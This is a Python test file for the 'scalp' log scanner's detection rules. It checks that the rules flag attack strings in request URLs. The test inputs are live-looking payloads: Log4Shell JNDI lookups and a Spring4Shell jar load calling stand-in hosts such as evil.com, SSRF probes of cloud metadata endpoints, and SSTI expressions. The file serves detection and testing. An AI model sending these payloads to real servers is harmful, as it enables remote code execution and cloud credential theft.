from pathlib import Path
import regex as re
from scalp.core.rules import RuleLoader

def test_modern_rules_load_and_validate():
    rules_path = Path("scalp/rules/modern_rules.json")
    assert rules_path.exists()
    rules = RuleLoader.load_json(rules_path)
    assert len(rules) >= 5
    for r in rules:
        assert r.rule_id != ""
        assert r.pattern != ""
        assert r.impact >= 5
        # Ensure pattern compiles
        compiled = re.compile(r.pattern, re.IGNORECASE)
        assert compiled is not None

def test_detects_log4shell_patterns():
    rules = RuleLoader.load_json("scalp/rules/modern_rules.json")
    log4j_rule = next(r for r in rules if "log4j" in r.tags)
    compiled = re.compile(log4j_rule.pattern, re.IGNORECASE)

    # Standard JNDI LDAP
    assert compiled.search("/search?q=${jndi:ldap://attacker.com/exploit}") is not None
    # JNDI RMI
    assert compiled.search("/?id=${jndi:rmi://10.0.0.1:1099/obj}") is not None
    # Lower evasion
    assert compiled.search("/?x=${${lower:j}ndi:dns://evil.com}") is not None

def test_detects_ssrf_metadata_and_protocols():
    rules = RuleLoader.load_json("scalp/rules/modern_rules.json")
    ssrf_rule = next(r for r in rules if "ssrf" in r.tags)
    compiled = re.compile(ssrf_rule.pattern, re.IGNORECASE)

    # AWS metadata
    assert compiled.search("/proxy?url=http://169.254.169.254/latest/meta-data/") is not None
    # GCP metadata
    assert compiled.search("/fetch?url=http://metadata.google.internal/computeMetadata/v1/") is not None
    # Cloudflare / Azure metadata
    assert compiled.search("/api/read?target=http://169.254.169.254/metadata/instance") is not None
    # Dangerous URI schemes
    assert compiled.search("/curl?u=gopher://127.0.0.1:6379/_") is not None

def test_detects_ssti_injections():
    rules = RuleLoader.load_json("scalp/rules/modern_rules.json")
    ssti_rule = next(r for r in rules if "ssti" in r.tags)
    compiled = re.compile(ssti_rule.pattern, re.IGNORECASE)

    # Jinja2 template math
    assert compiled.search("/greeting?name={{7*7}}") is not None
    # Jinja2 class access
    assert compiled.search("/hello?user={{self.__class__.__mro__[2]}}") is not None
    # Java Expression Language
    assert compiled.search("/calc?expr=${T(java.lang.Runtime).getRuntime()}") is not None

def test_detects_spring4shell():
    rules = RuleLoader.load_json("scalp/rules/modern_rules.json")
    spring_rule = next(r for r in rules if "spring" in r.tags or "deserialization" in r.tags)
    compiled = re.compile(spring_rule.pattern, re.IGNORECASE)

    assert compiled.search("/endpoint?class.module.classLoader.URLs[0]=jar:http://evil.com/x.jar") is not None
